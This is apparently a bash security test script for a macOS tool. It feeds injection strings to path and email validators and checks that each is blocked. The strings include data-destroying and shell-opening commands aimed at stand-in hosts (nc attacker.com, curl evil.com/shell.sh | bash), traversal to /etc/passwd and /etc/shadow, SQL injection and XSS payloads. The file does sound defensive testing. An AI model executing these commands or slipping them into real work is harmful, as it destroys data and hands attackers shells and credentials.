#!/bin/bash

# ===============================
# Security Test: Input Injection
# Tests protection against various injection attacks
# ===============================

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SUITE_DIR="$(cd "$SCRIPT_DIR/../.." && pwd)"

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Source validators
source "$SUITE_DIR/core/validators.sh" 2>/dev/null || true

# Test cases
test_command_injection() {
    echo "Testing command injection prevention..."
    
    local malicious_paths=(
        "/path; rm -rf /"
        "/path | nc attacker.com 4444"
        "/path && curl evil.com/shell.sh | bash"
        "/path \`whoami\`"
        "/path \$(id)"
    )
    
    local blocked=0
    for path in "${malicious_paths[@]}"; do
        if ! validate_path "$path" false 2>/dev/null; then
            blocked=$((blocked + 1))
        fi
    done
    
    if [ $blocked -eq ${#malicious_paths[@]} ]; then
        echo -e "${GREEN}✅ Command injection prevention: PASSED${NC}"
        return 0
    else
        echo -e "${RED}❌ Command injection prevention: FAILED ($blocked/${#malicious_paths[@]} blocked)${NC}"
        return 1
    fi
}

test_path_traversal() {
    echo "Testing path traversal prevention..."
    
    local malicious_paths=(
        "../../etc/passwd"
        "....//....//etc/passwd"
        "/path/../../../etc/shadow"
        "..\\..\\..\\windows\\system32"
    )
    
    local blocked=0
    for path in "${malicious_paths[@]}"; do
        if ! validate_path "$path" false 2>/dev/null; then
            blocked=$((blocked + 1))
        fi
    done
    
    if [ $blocked -eq ${#malicious_paths[@]} ]; then
        echo -e "${GREEN}✅ Path traversal prevention: PASSED${NC}"
        return 0
    else
        echo -e "${RED}❌ Path traversal prevention: FAILED ($blocked/${#malicious_paths[@]} blocked)${NC}"
        return 1
    fi
}

test_sql_injection() {
    echo "Testing SQL injection prevention..."
    
    # Note: MacGuardian doesn't use SQL, but test input validation anyway
    local malicious_inputs=(
        "'; DROP TABLE users; --"
        "1' OR '1'='1"
        "admin'--"
    )
    
    # These should be rejected by email/int validation
    local blocked=0
    for input in "${malicious_inputs[@]}"; do
        if ! validate_email "$input" 2>/dev/null; then
            blocked=$((blocked + 1))
        fi
    done
    
    if [ $blocked -eq ${#malicious_inputs[@]} ]; then
        echo -e "${GREEN}✅ SQL injection prevention: PASSED${NC}"
        return 0
    else
        echo -e "${RED}❌ SQL injection prevention: FAILED${NC}"
        return 1
    fi
}

test_xss_prevention() {
    echo "Testing XSS prevention..."
    
    local malicious_inputs=(
        "<script>alert('XSS')</script>"
        "javascript:alert('XSS')"
        "<img src=x onerror=alert('XSS')>"
    )
    
    # These should be rejected by validation
    local blocked=0
    for input in "${malicious_inputs[@]}"; do
        if ! validate_path "$input" false 2>/dev/null; then
            blocked=$((blocked + 1))
        fi
    done
    
    if [ $blocked -eq ${#malicious_inputs[@]} ]; then
        echo -e "${GREEN}✅ XSS prevention: PASSED${NC}"
        return 0
    else
        echo -e "${RED}❌ XSS prevention: FAILED${NC}"
        return 1
    fi
}

# Main
main() {
    echo "=========================================="
    echo "Security Test: Input Injection"
    echo "=========================================="
    echo ""
    
    local passed=0
    local failed=0
    
    if test_command_injection; then
        passed=$((passed + 1))
    else
        failed=$((failed + 1))
    fi
    
    if test_path_traversal; then
        passed=$((passed + 1))
    else
        failed=$((failed + 1))
    fi
    
    if test_sql_injection; then
        passed=$((passed + 1))
    else
        failed=$((failed + 1))
    fi
    
    if test_xss_prevention; then
        passed=$((passed + 1))
    else
        failed=$((failed + 1))
    fi
    
    echo ""
    echo "=========================================="
    echo "Security Test Summary"
    echo "=========================================="
    echo "Passed: $passed"
    echo "Failed: $failed"
    echo ""
    
    if [ $failed -eq 0 ]; then
        echo -e "${GREEN}✅ All security tests passed!${NC}"
        return 0
    else
        echo -e "${RED}❌ Some security tests failed${NC}"
        return 1
    fi
}

main "$@"

